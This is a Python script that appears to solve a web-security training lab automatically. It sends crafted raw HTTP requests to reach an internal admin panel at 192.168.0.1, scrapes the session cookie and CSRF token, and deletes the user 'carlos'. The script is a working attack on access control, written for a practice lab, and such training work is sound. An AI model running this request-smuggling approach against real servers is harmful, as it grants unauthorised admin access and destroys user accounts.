from web_security_academy.core.logger import logger
from web_security_academy.core.utils import render_template_file

from urllib.parse import urlparse
import re


def solve_lab(session):
    if session.proxies:
        logger.failure("Exploit code currently doesn't work through Burp Suite.")
        return

    session.get_path("/")
    req = render_template_file(
        "get.txt",
        hostname=urlparse(session.url).hostname,
        _lab=session.cookies["_lab"],
    ).replace("\n", "\r\n")
    resp = session.send_raw(req.encode()).decode()

    logger.info("Visited https://192.168.0.1/admin by sending the following payload:")
    print(req)

    cookie = re.findall(r"session=([A-Za-z0-9]+);", resp)[-1]
    csrf = re.findall(r'name="csrf" value="([A-Za-z0-9]+)"', resp)[-1]
    logger.info("Extracted session cookie and CSRF token")

    req = render_template_file(
        "post.txt",
        hostname=urlparse(session.url).hostname,
        cookie=cookie,
        _lab=session.cookies["_lab"],
        data=f"csrf={csrf}&username=carlos",
    ).replace("\n", "\r\n")
    session.send_raw(req.encode())

    logger.info('Deleted user "carlos" by sending the following payload:')
    print(req)
